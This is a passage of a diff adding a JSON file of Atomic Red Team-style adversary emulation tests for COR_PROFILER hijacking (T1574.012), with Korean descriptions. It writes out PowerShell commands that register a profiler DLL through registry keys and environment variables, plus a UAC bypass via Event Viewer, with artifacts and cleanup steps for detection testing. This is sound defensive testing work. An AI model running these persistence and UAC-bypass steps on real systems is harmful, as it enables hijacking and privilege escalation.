+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\<clsid_guid>\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\<clsid_guid>\\InprocServer32\" -Value \"<file_name>\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"<clsid_guid>\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"<file_name>\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC"
+        }
+      ],
+
+      "prerequisites": [
+        "<file_name> 경로에 프로파일러 DLL(T1574.012x64.dll)이 존재해야 한다(없으면 Atomic Red Team GitHub에서 다운로드해 저장).",
+        "테스트를 실행하는 계정으로 HKCU:\\Software\\Classes 및 HKCU:\\Environment에 레지스트리 키/값을 생성할 수 있어야 한다.",
+        "테스트 환경에 MMC 및 Event Viewer(EVENTVWR.MSC)가 존재해야 한다.",
+        "UAC 우회를 관찰하려면 테스트 계정이 로컬 관리자 그룹에 속해 있어야 한다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "<file_name>",
+            "description": "COR_PROFILER로 로드될 비관리 프로파일러 DLL(T1574.012x64.dll)"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "<file_name>",
+            "description": "CLR 로딩 시 InprocServer32로 지정된 경로에서 로드되는 프로파일러 DLL"
+          }
+        ],
+        "registry_keys": [
+          {
+            "path": "HKCU\\Software\\Classes\\CLSID\\<clsid_guid>\\InprocServer32",
+            "description": "COM CLSID에 대한 InprocServer32 경로로 프로파일러 DLL을 지정하는 키"
+          },
+          {
+            "path": "HKCU\\Environment",
+            "description": "COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH 사용자 환경 변수가 설정된 키"
+          }
+        ],
+        "processes": [
+          {
+            "name": "mmc.exe",
+            "description": "EVENTVWR.MSC를 로드하면서 CLR을 호출하고, 그 과정에서 COR_PROFILER DLL을 로드하는 프로세스",
+            "commandline_pattern": "MMC.EXE EVENTVWR.MSC"
+          },
+          {
+            "name": "notepad.exe",
+            "description": "프로파일러 DLL 로직에 의해 실행되는 페이로드 프로세스(높은 무결성 레벨로 실행될 수 있음)",
+            "commandline_pattern": "notepad.exe"
+          },
+          {
+            "name": "powershell.exe",
+            "description": "레지스트리 및 환경 변수 설정, Event Viewer 실행을 담당하는 PowerShell 프로세스",
+            "commandline_pattern": "*COR_PROFILER*"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\<clsid_guid>\" -Recurse -Force -ErrorAction Ignore 명령으로 CLSID 키를 제거한다.",
+        "Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null",
+        "Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null",
+        "Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null",
+        "필요 시 <file_name> DLL 파일도 수동으로 삭제한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a"
+      }
+    },
+    {
+      "test_id": "T1574.012-2",
+      "name": "System Scope COR_PROFILER",
+      "platforms": ["windows"],
+
+      "summary": "시스템 범위(HKLM) 환경 변수에 COR_PROFILER를 설정해, CLR이 어느 프로세스에서든 로드될 때 프로파일러 DLL이 실행되도록 만드는 시나리오이다. 세션 관리자(Environment) 키에 COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH를 등록하며, 시스템 재부팅 후 모든 .NET 프로세스가 해당 프로파일러를 로드할 수 있다. Event Viewer 등 고무결 프로세스 실행 시 UAC 우회 및 고권한 notepad.exe 실행이 가능하다.",
+
+      "procedure": [
+        "<file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건에서 다운로드).",
+        "PowerShell을 관리자 권한으로 실행한다.",
+        "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment 경로에 COR_ENABLE_PROFILING=1, COR_PROFILER=<clsid_guid>, COR_PROFILER_PATH=<file_name> 시스템 환경 변수를 추가한다.",
+        "변경 사항을 완전히 적용하려면 시스템을 재부팅한다.",
+        "재부팅 후 Event Viewer 또는 다른 .NET 기반 애플리케이션을 실행해 프로파일러 DLL이 로드되고 페이로드가 실행되는지 확인한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"<clsid_guid>\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"<file_name>\" -Force | Out-Null"
+        }
+      ],
+
+      "prerequisites": [
+        "<file_name> 경로에 프로파일러 DLL(T1574.012x64.dll)이 존재해야 한다(없으면 GitHub에서 다운로드).",
+        "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment 키에 쓰기 가능한 관리자 권한이 필요하다.",
+        "해당 변경 사항이 적용되도록 시스템 재부팅이 가능해야 한다.",
+        ".NET 런타임이 설치되어 있고, 재부팅 후 CLR을 사용하는 프로세스가 실제로 실행되어야 효과를 관찰할 수 있다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "<file_name>",
+            "description": "시스템 전체에서 로드될 프로파일러 DLL"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "<file_name>",
+            "description": "CLR 로딩 시 system-wide COR_PROFILER_PATH를 통해 참조되는 DLL"
+          }
+        ],
+        "registry_keys": [
+          {
+            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
+            "description": "COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH 시스템 환경 변수가 설정된 키"
+          }
+        ],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "시스템 범위 환경 변수를 설정하는 PowerShell 프로세스",
+            "commandline_pattern": "*COR_ENABLE_PROFILING*"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null",
+        "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null",
+        "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null",
+        "필요 시 시스템 재부팅을 통해 변경된 환경 변수를 초기화된 상태에서 재적용하도록 한다(삭제 후)."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "f373b482-48c8-4ce4-85ed-d40c8b3f7310"
+      }
+    },
+    {
+      "test_id": "T1574.012-3",
+      "name": "Registry-free process scope COR_PROFILER",
+      "platforms": ["windows"],
+
+      "summary": "레지스트리 변경 없이, 현재 프로세스 범위에서만 COR_PROFILER 환경 변수를 설정해 .NET 프로파일러를 활성화하는 시나리오이다. PowerShell 세션 내에서 환경 변수를 설정한 후, 동일 세션에서 PowerShell -c 'Start-Sleep 1'을 실행해 CLR을 로드하고 프로파일러 DLL(T1574.012x64.dll)이 실행되도록 한다. 디스크/레지스트리 흔적을 최소화한 단발성 실행·테스트에 유용하다.",
+
+      "procedure": [
+        "<file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건에서 다운로드).",
+        "PowerShell에서 $env:COR_ENABLE_PROFILING = 1, $env:COR_PROFILER = '<clsid_guid>', $env:COR_PROFILER_PATH = '\"<file_name>\"' 값을 설정한다.",
+        "동일한 PowerShell 세션에서 POWERSHELL -c 'Start-Sleep 1' 명령을 실행해 하위 PowerShell 프로세스에서 CLR을 로드한다.",
+        "프로파일러 DLL이 로드되어 페이로드가 실행되는지(예: notepad.exe 실행, 기타 동작) 관찰한다.",
+        "테스트 후 환경 변수를 초기화해($env:COR_* 값 리셋) 추가 CLR 로딩 시 더 이상 프로파일러가 사용되지 않도록 한다."
+      ],
+
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '<clsid_guid>'\n$env:COR_PROFILER_PATH = '\"<file_name>\"'\nPOWERSHELL -c 'Start-Sleep 1'"
+        }
+      ],
+
+      "prerequisites": [
+        "<file_name> 경로에 프로파일러 DLL(T1574.012x64.dll)이 존재해야 한다.",
+        "PowerShell 환경에서 프로세스 범위 환경 변수를 설정할 수 있어야 한다.",
+        "테스트 중에만 유효한 일시적 설정이므로, 같은 PowerShell 세션 안에서 CLR을 사용하는 명령을 실행해야 한다."
+      ],
+
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "<file_name>",
+            "description": "Process scope에서 로드될 프로파일러 DLL"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "<file_name>",
+            "description": "하위 PowerShell 프로세스에서 CLR 로딩 시 참조되는 DLL"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "환경 변수를 설정하고 하위 PowerShell 프로세스를 실행해 CLR을 로드하는 프로세스",
+            "commandline_pattern": "POWERSHELL -c 'Start-Sleep 1'"
+          }
+        ],
+        "network": []
+      },
+
+      "cleanup": [
+        "$env:COR_ENABLE_PROFILING = 0",
+        "$env:COR_PROFILER = ''",
+        "$env:COR_PROFILER_PATH = ''",
+        "해당 PowerShell 세션을 종료해 프로세스 범위 환경 변수를 완전히 정리한다."
+      ],
+
+      "metadata": {
+        "atomic_source_id": "79d57242-bbef-41db-b301-9d01d9f6e817"
+      }
+    }
+  ]
 }
+
+
+
+
+
 
 ]
